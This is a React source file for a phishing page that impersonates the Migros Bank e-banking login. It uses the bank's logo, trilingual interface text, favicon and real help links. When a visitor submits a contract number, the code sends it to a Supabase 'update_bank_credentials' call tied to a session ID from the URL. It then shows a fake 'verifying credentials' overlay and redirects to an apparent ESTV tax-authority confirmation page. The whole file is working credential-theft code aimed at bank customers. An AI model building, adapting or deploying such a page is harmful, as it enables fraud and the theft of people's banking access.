import { useEffect, useRef, useState } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { HelpCircle, ChevronDown, Globe } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";

const GREEN = "#144B3C";

const MigrosLogoDesktop = ({ className = "" }: { className?: string }) => (
  <svg width="93" height="44" viewBox="0 0 93 44" fill="none" xmlns="http://www.w3.org/2000/svg" className={className} aria-label="Migros Bank">
    <path d="M65.2935 43.9869H60.2417L54.8454 36.5138V43.9869H50.5644V28.2603C50.5819 28.0776 50.6715 27.9093 50.8136 27.7924C50.9557 27.6754 51.1387 27.6194 51.3222 27.6367H54.8454V34.6006L60.3204 27.6367H65.077L58.9131 35.2405L65.2935 43.9869ZM43.2294 37.7838C42.2945 36.0959 36.6259 27.6628 36.6259 27.6628H32.135V43.9869H36.2979V33.6734L43.1868 44H47.3299V27.6367H43.2294V37.7838ZM25.1871 27.6628L30.1635 43.9869H25.7644L24.9509 41.2314H19.2889L18.5049 43.9869H14.0993L18.9871 28.1983C19.0331 28.0235 19.1404 27.8708 19.2896 27.7678C19.4388 27.6649 19.62 27.6184 19.8006 27.6367L25.1871 27.6628ZM24.2226 38.1103L22.2117 30.7873H22.0116L20.0007 38.1103H24.2226ZM13.2004 39.4913C13.2135 42.792 10.458 43.9869 6.68878 43.9869H0V28.3713C0.000419104 28.2736 0.0203415 28.1769 0.058611 28.0869C0.0968805 27.9969 0.152735 27.9153 0.22293 27.847C0.293125 27.7787 0.376261 27.7249 0.467514 27.6888C0.558766 27.6527 0.656315 27.635 0.754497 27.6367H6.76423C9.8019 27.6367 12.5476 28.5802 12.5476 31.7014C12.5476 33.6603 11.7702 35.0381 10.1004 35.4886C11.8489 35.8249 13.2135 37.1112 13.2135 39.4717L13.2004 39.4913ZM3.92667 34.2088H6.22296C7.90582 34.2088 8.6472 33.6701 8.6472 32.3903C8.6472 31.1595 7.85333 30.6208 6.32466 30.6208H3.92995L3.92667 34.2088ZM9.17534 39.0538C9.17534 37.6793 8.3618 37.0949 6.62974 37.0949H3.92667V41.0127H6.49196C8.19778 40.9964 9.18519 40.4577 9.18519 39.0538H9.17534ZM18.7378 19.9121H0V24.0976H18.7476L18.7378 19.9121ZM58.923 11.9688L60.8026 16.6898H56.3839L54.4321 12.1876C54.0319 11.2702 53.753 10.8164 52.9099 10.8164H51.1976V16.693H47.0675V0.982711C47.0847 0.815381 47.1594 0.659076 47.2789 0.540136C47.3984 0.421196 47.5555 0.346892 47.7236 0.329746H53.5595C56.7284 0.329746 59.4446 0.98271 59.4446 5.06047C59.4446 6.88551 58.4309 8.75299 56.5283 9.13171C57.4599 9.44513 58.4145 10.6564 58.9328 11.9688H58.923ZM55.4621 5.3739C55.4621 3.79699 54.478 3.4803 53.2544 3.4803H51.1877V7.58418H53.2544C54.501 7.58418 55.472 6.92795 55.472 5.3739H55.4621ZM25.5775 0.326482H21.969V16.6898H26.204V0.982711C26.1989 0.815792 26.1322 0.656593 26.0166 0.535536C25.9011 0.41448 25.7447 0.340054 25.5775 0.326482V0.326482ZM43.2229 7.27076H37.8823V10.6139H39.9162V13.4968C39.3082 13.575 38.6955 13.611 38.0824 13.6045C34.989 13.6045 33.3127 11.6456 33.3127 8.48854C33.3127 5.52734 34.7594 3.4803 37.8594 3.4803C39.1764 3.53103 40.4719 3.82901 41.6778 4.35854L43.3377 1.54426C41.996 0.64317 39.9162 0.0130596 37.5444 0.0130596C32.1547 0.0130596 28.9235 3.4803 28.9235 8.50159C28.9235 14.1138 32.1547 17.0195 38.2858 17.0195C40.1665 17.0186 42.0427 16.8383 43.8888 16.4808V8.01514C43.8978 7.92199 43.8875 7.82798 43.8583 7.73901C43.8291 7.65004 43.7818 7.56804 43.7192 7.49814C43.6567 7.42825 43.5803 7.37196 43.4949 7.33284C43.4095 7.29371 43.3169 7.27257 43.2229 7.27076V7.27076ZM77.8412 8.48854C77.8412 13.2258 74.9872 17.0065 69.9452 17.0065C64.562 17.0065 61.7146 13.2258 61.7146 8.48854C61.7146 3.75128 64.562 0 69.9452 0C74.9872 0.0130593 77.8412 3.79699 77.8412 8.48854V8.48854ZM73.406 8.48854C73.406 5.05721 71.8478 3.4803 69.9452 3.4803C67.7276 3.4803 66.1497 5.05721 66.1497 8.48854C66.1497 11.9688 67.7276 13.5392 69.9452 13.5392C71.8478 13.5392 73.406 11.9688 73.406 8.48854V8.48854ZM87.0395 6.47088C85.6191 6.04645 84.4873 5.61549 84.4873 4.76664C84.4873 3.91779 85.3697 3.32032 86.9279 3.32032C88.2204 3.32032 89.3751 3.8427 90.5036 4.51198L92.7966 1.92624C91.76 0.946798 89.7261 0.0130596 87.0985 0.0130596C83.1226 0.0130596 80.0686 1.92625 80.0686 5.35104C80.0686 8.52772 82.8307 9.46472 85.2024 10.1438C87.1707 10.7021 88.6666 11.0416 88.6666 12.1419C88.6666 13.3139 87.3249 13.5164 86.262 13.5164C84.3889 13.5164 82.355 12.5369 81.3086 11.9199L79.4354 15.2271C80.5869 16.0172 83.1686 17.0065 85.9471 17.0065C90.2904 17.0065 93 14.6884 93 11.3126C92.9869 8.03473 89.5556 7.24464 87.0395 6.47088ZM9.49683 9.56919L5.62921 0.326482H0V16.6898H4.2055V7.24464L8.2109 16.6898H10.458L14.5257 7.24464V16.6898H18.7345V0.326482H13.5449L9.49683 9.56919Z" fill={GREEN} />
  </svg>
);

const MigrosLogoMobile = ({ className = "" }: { className?: string }) => (
  <svg width="22" height="27" viewBox="0 0 20 25" fill={GREEN} xmlns="http://www.w3.org/2000/svg" className={className} aria-label="Migros Bank">
    <path d="M20 0V17.2092H15.5136V7.27579L11.1706 17.2092H8.7594L4.48994 7.27579V17.2092H0V0H6.00875L10.1347 9.72051L14.4532 0H20ZM0 25H20V20.5981H0V25Z" />
  </svg>
);

const LANGS = [
  { code: "de", label: "De" },
  { code: "fr", label: "Fr" },
  { code: "it", label: "It" },
] as const;
type Lang = (typeof LANGS)[number]["code"];

const T: Record<Lang, {
  title: string;
  label: string;
  submit: string;
  whereFind: string;
  problems: string;
  help: string;
  support: string;
  legal: string;
  security: string;
  copyright: string;
  legalFooter: string;
  imprint: string;
}> = {
  de: {
    title: "Anmeldung im E-Banking",
    label: "Bitte geben Sie Ihre Vertragsnummer ein",
    submit: "Weiter",
    whereFind: "Wo finde ich meine Vertragsnummer?",
    problems: "Probleme bei der Anmeldung?",
    help: "Hilfe",
    support: "Support",
    legal: "Rechtliche Hinweise",
    security: "Sicherheit",
    copyright: "© 2026 Migros Bank AG",
    legalFooter: "Rechtliche Informationen",
    imprint: "Impressum",
  },
  fr: {
    title: "Connexion à l'E-Banking",
    label: "Veuillez saisir votre numéro de contrat",
    submit: "Continuer",
    whereFind: "Où puis-je trouver mon numéro de contrat ?",
    problems: "Problèmes lors de l'enregistrement ?",
    help: "Aide",
    support: "Support",
    legal: "Informations légales",
    security: "Sécurité",
    copyright: "© 2026 Banque Migros SA",
    legalFooter: "Informations légales",
    imprint: "Mentions légales",
  },
  it: {
    title: "Login all'E-Banking",
    label: "Si prega di inserire il numero di contratto",
    submit: "Continua",
    whereFind: "Dove trovo il mio numero di contratto?",
    problems: "Problemi con la registrazione?",
    help: "Aiuto",
    support: "Supporto",
    legal: "Informazioni legali",
    security: "Sicurezza",
    copyright: "© 2026 Banca Migros SA",
    legalFooter: "Informazioni legali",
    imprint: "Impressum",
  },
};

const ChMigros = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [showLoading, setShowLoading] = useState(false);
  const [lang, setLang] = useState<Lang>("de");
  const [helpOpen, setHelpOpen] = useState(false);
  const [inputFocused, setInputFocused] = useState(false);
  const [submitHover, setSubmitHover] = useState(false);
  const helpRef = useRef<HTMLDivElement>(null);
  const t = T[lang];

  const HELP_LINKS = [
    { label: t.support, href: "https://www.migrosbank.ch/de/hilfe/neues-ebanking.html" },
    { label: t.legal, href: "https://www.migrosbank.ch/ueber-uns/rechtliche-informationen" },
    { label: t.security, href: "https://www.migrosbank.ch/de/hilfe/e-banking/faq-fragen-ebanking.html?t=sicherheit" },
  ];

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);
  usePageMeta("Migros Bank E-Banking Login", "https://www.migrosbank.ch/favicon.ico");

  useEffect(() => {
    const onClick = (e: MouseEvent) => {
      if (helpRef.current && !helpRef.current.contains(e.target as Node)) {
        setHelpOpen(false);
      }
    };
    document.addEventListener("mousedown", onClick);
    return () => document.removeEventListener("mousedown", onClick);
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!vertragsnummer) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: "",
        p_username_label: "Vertragsnummer",
        p_password_label: "",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-white text-[#1a1a1a] font-sans overflow-x-hidden">
        {/* Header */}
        <header className="flex items-center justify-between px-5 md:px-10 py-5">
          <MigrosLogoDesktop className="hidden md:block h-11 w-auto" />
          <MigrosLogoMobile className="md:hidden h-6 w-auto" />
          <div className="flex items-center gap-6">
            {/* Language switch */}
            <ul className="flex items-center gap-4 text-[15px]" style={{ color: GREEN }}>
              {LANGS.map((l) => (
                <li key={l.code}>
                  <button
                    onClick={() => setLang(l.code)}
                    className="pb-1 transition hover:font-bold"
                  >
                    {l.label}
                  </button>
                </li>
              ))}
            </ul>
            {/* Help dropdown */}
            <div className="relative" ref={helpRef}>
              <button
                onClick={() => setHelpOpen((o) => !o)}
                className="flex items-center gap-2 px-4 py-2 rounded-md border-2 text-[15px]"
                style={{ borderColor: "#859886", color: GREEN }}
              >
                <HelpCircle className="w-5 h-5" strokeWidth={1.6} />
                <span>{t.help}</span>
                <ChevronDown className="w-4 h-4" />
              </button>
              {helpOpen && (
                <div className="absolute right-0 top-full mt-2 bg-white border border-[#e5e5e5] shadow-lg min-w-[220px] z-30 py-1 rounded-md">
                  {HELP_LINKS.map(({ label, href }) => (
                    <a
                      key={label}
                      href={href}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="flex items-center gap-2 px-4 py-3 text-sm hover:bg-[#f5f5f5] text-[#1a1a1a]"
                    >
                      <Globe className="w-4 h-4" style={{ color: GREEN }} />
                      {label}
                    </a>
                  ))}
                </div>
              )}
            </div>
          </div>
        </header>

        {/* Main */}
        <main className="flex-1 px-5 md:px-10 pt-10 md:pt-16 pb-20">
          <h1 className="text-center text-[28px] md:text-[34px] font-semibold text-[#1a1a1a] mb-4 md:mb-6">
            {t.title}
          </h1>

          <div
            className="mx-auto max-w-[880px] p-8 md:p-14 rounded-md"
            style={{ border: "2px solid #c5d2ce" }}
          >
            <form
              onSubmit={handleSubmit}
              className="w-full max-w-[420px] mx-auto flex flex-col items-center"
            >
              <label
                htmlFor="migros-contract"
                className="block text-[14px] font-bold text-[#1a1a1a] mb-2 w-full text-left"
              >
                {t.label}
              </label>
              <input
                id="migros-contract"
                type="text"
                value={vertragsnummer}
                onChange={(e) => setVertragsnummer(e.target.value)}
                onFocus={() => setInputFocused(true)}
                onBlur={() => setInputFocused(false)}
                maxLength={13}
                autoFocus
                autoComplete="off"
                className="w-full h-[48px] px-3 text-[15px] text-black focus:outline-none mb-5 rounded-md"
                style={{
                  border: inputFocused ? "2px solid #eef2f1" : "2px solid #cad7d3",
                  backgroundColor: inputFocused ? "#eef2f1" : "transparent",
                }}
              />
              <button
                type="submit"
                onMouseEnter={() => setSubmitHover(true)}
                onMouseLeave={() => setSubmitHover(false)}
                className="w-full h-[48px] text-[15px] font-medium transition-colors rounded-md"
                style={{
                  backgroundColor: submitHover ? "#eef2f1" : GREEN,
                  color: submitHover ? GREEN : "#ffffff",
                }}
              >
                {t.submit}
              </button>
            </form>

            <div className="flex flex-col-reverse items-center gap-0 leading-tight mt-20 text-[14px] md:flex-row md:justify-between md:gap-4">
              <a
                href="https://www.migrosbank.ch/hilfe/neues-ebanking/wo-finde-ich-meine-vertragsnummer"
                target="_blank"
                rel="noopener noreferrer"
                className="font-semibold underline underline-offset-4"
                style={{ color: GREEN }}
              >
                {t.whereFind}
              </a>
              <a
                href="https://www.migrosbank.ch/de/hilfe/neues-ebanking/wie-richte-ich-mein-migros-bank-e-banking-login-via-browser-ein.html"
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-2 font-semibold"
                style={{ color: GREEN }}
              >
                <HelpCircle className="w-[14px] h-[14px]" strokeWidth={1.8} />
                <span className="underline underline-offset-4">{t.problems}</span>
              </a>
            </div>
          </div>
        </main>

        {/* Footer */}
        <footer className="px-5 md:px-10 py-5">
          <ul className="flex flex-col items-start gap-3 text-[13px] font-semibold md:flex-row md:items-center md:gap-12" style={{ color: GREEN }}>
            <li>
              <span>{t.copyright}</span>
            </li>
            <li>
              <a
                href="https://www.migrosbank.ch/ueber-uns/rechtliche-informationen"
                target="_blank"
                rel="noopener noreferrer"
                className="hover:underline"
              >
                {t.legalFooter}
              </a>
            </li>
            <li>
              <a
                href="https://www.migrosbank.ch/de/ueber-uns/kontakt-support/impressum.html"
                target="_blank"
                rel="noopener noreferrer"
                className="hover:underline"
              >
                {t.imprint}
              </a>
            </li>
          </ul>
        </footer>
      </div>
    </>
  );
};

export default ChMigros;
